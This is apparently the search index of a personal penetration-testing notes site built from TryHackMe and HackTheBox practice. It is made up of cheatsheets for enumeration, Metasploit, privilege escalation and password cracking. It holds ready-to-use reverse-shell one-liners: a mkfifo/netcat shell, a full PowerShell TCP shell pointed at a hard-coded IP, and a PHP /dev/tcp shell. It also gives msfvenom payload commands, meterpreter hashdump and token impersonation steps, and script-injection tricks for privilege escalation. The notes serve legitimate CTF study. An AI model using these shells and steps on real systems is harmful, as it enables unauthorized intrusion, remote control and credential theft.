{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"WELCOME!","text":"<p>Probably nothing you haven't seen before but they will be something I can easily and publicly refer to when needed.</p>"},{"location":"#cheatsheets","title":"CHEATSHEETS","text":"<p>Overall notes for referencing:</p> <ul> <li>Buffer Overflow</li> <li>Exploitation</li> <li>Terminal</li> </ul>"},{"location":"#tryhackme","title":"TRYHACKME","text":"<ul> <li>Need to transfer</li> </ul>"},{"location":"#hackthebox","title":"HACKTHEBOX","text":"<ul> <li>Need to transfer</li> </ul>"},{"location":"bufferoverflow/","title":"CHEATSHEET","text":"<p>Immunity Debugger used in Windows How to generate buffer overflow patterns: <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</code></p>"},{"location":"bufferoverflow/#finding-the-eip-offset","title":"Finding the EIP Offset","text":"<p>send (\"A\" * 100) bytes to endpoint</p>"},{"location":"bufferoverflow/#exploiting-the-offset","title":"Exploiting the offset","text":""},{"location":"enumeration/","title":"Enumeration","text":"<p>Documenting different ways to uncover ways to gain intial access and exploiting them.</p>"},{"location":"enumeration/#table-of-contents","title":"Table of Contents","text":"<ul> <li>NMAP</li> <li>SMB</li> <li>FTP</li> <li>HTTP</li> </ul>"},{"location":"enumeration/#nmap","title":"NMAP","text":"<p>As an alternative you can use <code>rustscan -a &lt;address&gt;</code></p> <p>Normal scan: <code>nmap -vv -sV -Pn -A -T4 --script vuln &lt;address&gt;</code> Long scan: <code>nmap -sV -Pn -A -T4 -p- &lt;address&gt;</code></p>"},{"location":"enumeration/#smb","title":"SMB","text":""},{"location":"enumeration/#initial-access","title":"Initial Access","text":"<p><code>smbmap -H &lt;address&gt;</code> Check discovered directories in other places such as websites. <code>smbclient -L &lt;address&gt; -U</code> List all the directories in the share Enumerate SMB via NMAP: <code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse &lt;address&gt;</code></p>"},{"location":"enumeration/#ftp","title":"FTP","text":""},{"location":"enumeration/#initial-access_1","title":"Initial Access","text":""},{"location":"enumeration/#anonymous-login","title":"Anonymous Login","text":"<p><code>ftp &lt;address&gt;</code> login: anonymous (no password required)</p>"},{"location":"enumeration/#nmap-scripts","title":"NMAP Scripts","text":"<p><code>nmap --script ftp-* -p 21 &lt;address&gt;</code></p>"},{"location":"enumeration/#brute-force","title":"Brute Force","text":"<p>ftp-betterdefaultpasslist</p>"},{"location":"enumeration/#investigation","title":"Investigation","text":""},{"location":"enumeration/#download-all-files","title":"Download all files","text":"<p><code>wget -m ftp://anonymous:anonymous@&lt;address&gt;</code> <code>wget -m --no-passive ftp://anonymous:anonymous@&lt;address&gt;</code></p>"},{"location":"enumeration/#http","title":"HTTP","text":""},{"location":"enumeration/#initial-access_2","title":"Initial Access","text":""},{"location":"enumeration/#directory-discovery","title":"Directory Discovery","text":"<p>GoBuster: <code>gobuster dirb --url=&lt;address&gt; --wordlist=&lt;wordlist&gt;</code> After running go buster manually explore some interesting directories, such as robots.txt.</p>"},{"location":"enumeration/#password-discovery","title":"Password Discovery","text":"<p>If you are having trouble brute-forcing a password for a blog, try creating a custom wordlist with cewl: <code>cewl -d 3 -m 7 -w &lt;wordlist to export&gt; &lt;http://address.com&gt;</code></p>"},{"location":"enumeration/#reverse-shells","title":"Reverse Shells","text":"<p>See Reverse Shells for more information.</p>"},{"location":"enumeration/#post-exploitation","title":"Post-Exploitation","text":""},{"location":"enumeration/#check-services-and-ports","title":"Check Services and Ports","text":"<p>Running Ports: <code>ss -natu</code> <code>netstat -tulpn | grep LISTEN</code> Forwarding ports through ssh: <code>ssh -L &lt;local port&gt;:&lt;remote address&gt;:&lt;remote port&gt; &lt;username&gt;@&lt;address&gt;</code></p>"},{"location":"enumeration/#python","title":"Python","text":""},{"location":"enumeration/#reverse-shell-upgrade","title":"Reverse Shell Upgrade","text":"<p><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code></p>"},{"location":"enumeration/#simple-http-server","title":"Simple HTTP Server","text":"<p>If you need to get a file over to a compromised server with curl installed: <code>python3 -m http.server</code></p>"},{"location":"enumeration/#shell","title":"Shell","text":""},{"location":"enumeration/#suid-search","title":"SUID search","text":"<p><code>find / -user root -perm -4000 -exec ls -ldb {} \\;</code> <code>find / -perm -u=s -type f 2&gt;/dev/null</code> BEST: <code>find / -perm -u=s -type f 2&gt;/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000 2&gt;/dev/null</code></p> <p>If you find a binary that matches this, you can try running with the <code>-p</code> flag which allows you to run a binary as the owner.</p> <p>EXAMPLE USES: nmap -i find  -exec  \\;"},{"location":"enumeration/#sneaky-reverse-shell-bash","title":"Sneaky Reverse Shell Bash","text":"<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f\n</code></pre>"},{"location":"enumeration/#find-writable-directories","title":"Find writable directories","text":"<p><code>find -type d -writable</code></p>"},{"location":"enumeration/#windows-migration","title":"Windows Migration","text":"<p>get a meterpreter session and find a process running as SYSTEM: <code>ps</code> safest choice is to choose <code>services.exe</code> <code>migrate &lt;process id&gt;</code></p>"},{"location":"enumeration/#windows-passwords","title":"Windows Passwords","text":"<p>within meterpreter session: <code>hashdump</code></p>"},{"location":"enumeration/#using-powershell","title":"Using Powershell","text":"<p><code>load powershell</code> then <code>powershell_shell</code></p>"},{"location":"enumeration/#windows-token-exploitation","title":"Windows Token Exploitation","text":"<p>powershell <code>whoami /priv</code> msf <code>load incognito</code> <code>list_tokens -g</code> then <code>impersonate_token &lt;name of token&gt;</code></p>"},{"location":"enumeration/#tools","title":"Tools","text":"<p>A series of a userful links: - Nishang: A series of useful Windows Exploit scripts - PowerSploit Same as above</p>"},{"location":"enumeration/#powershell-reverse-shell","title":"Powershell Reverse Shell","text":"<p><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.8.219.14',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"</code></p>"},{"location":"enumeration/#starting-smb-server","title":"Starting SMB Server","text":"<p>Navigate to folder to share</p> <p><code>python3 /usr/share/doc/impacket-scripts/examples/smbserver.py SHARE .</code></p>"},{"location":"enumeration/#starting-ftp-server","title":"Starting FTP Server","text":"<p>Install <code>sudo apt-get install python3-pyftpdlib</code></p> <p><code>python3 -m pyftpdlib -p 21</code></p> <p>Pull everything in a folder: `wget -mbr --username=\"anonymous\" --password=\"\" \"ftp:////*\""},{"location":"enumeration/#powershell","title":"Powershell","text":"<ul> <li>Search for command with name: <code>Get-Command *search_parameter*</code></li> <li>Get all Parameters for a command: <code>(Get-Command Command).Parameters</code></li> <li>Search for a file: <code>Get-ChildItem -Path C:\\ -Include *title* -File -Recurse -ErrorAction SilentlyContinue</code></li> <li>Search for files containing string: <code>Get-ChildItem C:\\* -Recurse | Select-String -pattern search_string</code></li> <li>Get list of running processes: <code>Get-Process</code></li> </ul>"},{"location":"kali/","title":"Kali","text":"<p>Useful tips and tricks for using Kali Linux to its full potential:</p>"},{"location":"kali/#binary-locations","title":"Binary Locations","text":"<p>Various binaries that can be used for exploitation or enumeration within a system can be found in: </p> <ul> <li>Windows: <code>/usr/share/windows-resources/</code></li> </ul>"},{"location":"metasploit/","title":"Metasploit","text":"<p>Avoid using it as much as possible. Anything that can be done with msf can be done better manually.</p> <p>open <code>msfconsole</code> <code>search &lt;exploit name&gt;</code> <code>use &lt;discovered id&gt;</code> <code>show options</code> set the required options for the exploit <code>exploit</code> or <code>run</code> you can then hold on to the shell once it has been achieved by putting it into the background <code>Ctrl-Z</code></p>"},{"location":"metasploit/#upgrade-shell-to-meterpreter","title":"Upgrade shell to Meterpreter","text":""},{"location":"metasploit/#option-1","title":"Option 1","text":"<p>search for shell_to_meterpreter use and set session to the session number of the session that needs upgrading</p>"},{"location":"metasploit/#option-2","title":"Option 2","text":"<p><code>sessions -u &lt;id&gt;</code></p>"},{"location":"metasploit/#catching-a-reverse-shell","title":"Catching a Reverse Shell","text":"<p>generate the reverse shell in msfvenon <code>use exploit/multi/handler</code> <code>set PAYLOAD windows/meterpreter/reverse_tcp</code></p>"},{"location":"metasploit/#msfvenom","title":"Msfvenom","text":"<p>There are two types of payloads that can be generated, staged and stageless. Staged means you need msfconsole to complete the shell, used for limited upload space. Staged, denoted by '/': windows/shell/reverse_tcp Stageless, denoted by '_': windows/shell_reverse_tcp</p> <p>To search for payloads: <code>msfvenom -l payloads | grep windows</code> When setting up: <code>msfvenom -p payload --list-options</code></p> <p>encoders:     windows: <code>-a x86 --encoder x86/shikata_ga_nai -f exe -o &lt;filename&gt;.exe</code></p> <p>IIS Example: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.219.14 --platform windows -a x64 -f aspx -o shell.aspx</code></p>"},{"location":"terminal/","title":"Terminal","text":"<p>A series of useful commands and actions to take full command of any terminal.</p>"},{"location":"terminal/#table-of-contents","title":"Table of Contents","text":"<ul> <li>TMUX</li> <li>Jobs</li> <li>Files</li> <li>History</li> </ul>"},{"location":"terminal/#tmux","title":"TMUX","text":"<p>Everything needs (CTRL+b) before selecting anything below</p>"},{"location":"terminal/#mspliting-the-window","title":"mSpliting the window","text":"<ul> <li>% -&gt; (left/right)</li> <li>\" -&gt; (top/bottom)</li> </ul>"},{"location":"terminal/#choosing-panes","title":"Choosing panes","text":"<ul> <li>o -&gt; Shift panes</li> <li>; -&gt; Go back to last pane</li> <li>q -&gt; Display pane numbers</li> <li>x -&gt; Kill the pane</li> </ul>"},{"location":"terminal/#changing-windows","title":"Changing Windows","text":"<ul> <li>0-9 -&gt; Choose window</li> <li>p -&gt; Change to the previous window</li> </ul>"},{"location":"terminal/#jobs","title":"Jobs","text":"<p>Working with background jobs and bringing them to the fore when required:</p> <ul> <li>CTRL + Z -&gt; background and suspend</li> <li>bg -&gt; resume background</li> <li>&amp; -&gt; (at end of command = send to background)</li> <li>fg % [job no.] -&gt; bring job number to the front</li> <li>jobs -&gt; list all of the running background jobs in session</li> </ul>"},{"location":"terminal/#files","title":"Files","text":"<p>Quick ways to edit and interact with files only using the termianl (not comprehensive)</p> <ul> <li>less  (allows for scrolling) <li>sort  | uniq &gt;  (sorts strings by newline and removes duplicates) <li>tail -n +  &gt;  (removes beginning of file)"},{"location":"terminal/#history","title":"History","text":"<p>Reuse an old command: <code>history | grep &lt;parameter&gt;</code>, <code>!!&lt;choice&gt;</code></p>"},{"location":"exploitation/passwords/","title":"Cracking Passwords","text":"<p>First search for hash via Search-the-hash <code>sth -t &lt;hash&gt;</code> or <code>sth -f &lt;file&gt;</code> If not found you can use <code>john</code> or <code>hashcat</code> Example hashcat (use <code>--help</code> for more guidance): <code>hashcat -m &lt;type of hash&gt; -a &lt;cracking type&gt; &lt;hash&gt;:&lt;salt&gt; &lt;wordlist&gt; --show</code> Note: must use <code>--show</code> to actually see the cracked password...</p>"},{"location":"exploitation/reverse_shells/","title":"Reverse Shells","text":"<p>Useful links and one liners to establish a connection to a compromised device.</p>"},{"location":"exploitation/reverse_shells/#linux-target","title":"Linux Target","text":""},{"location":"exploitation/reverse_shells/#php","title":"PHP","text":"<p>Simple one-liner:</p> <pre><code>&lt;?php\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker ip&gt;/1234 0&gt;&amp;1'\");\n?&gt;\n</code></pre>"},{"location":"exploitation/reverse_shells/#windows-target","title":"Windows Target","text":""},{"location":"exploitation/reverse_shells/#php_1","title":"PHP","text":"<p>Useful links: - Link to RS</p>"},{"location":"privesc/linux/","title":"Linux Priv Esc","text":"<p>GTFO</p>"},{"location":"privesc/linux/#exploiting-scriptprogram-ownership","title":"Exploiting Script/Program Ownership","text":"<p>If a custom script is located in the box that is executed by another user, injecting something like: <code>import pty; pty.spawn(\"/bin/bash\");</code> will allow you to immediately login as the new user without needing to setup a reverse shell.</p>"},{"location":"privesc/windows/","title":"Windows Priv Esc","text":"<p>Net Login: GPO can contain credentials.</p>"}]}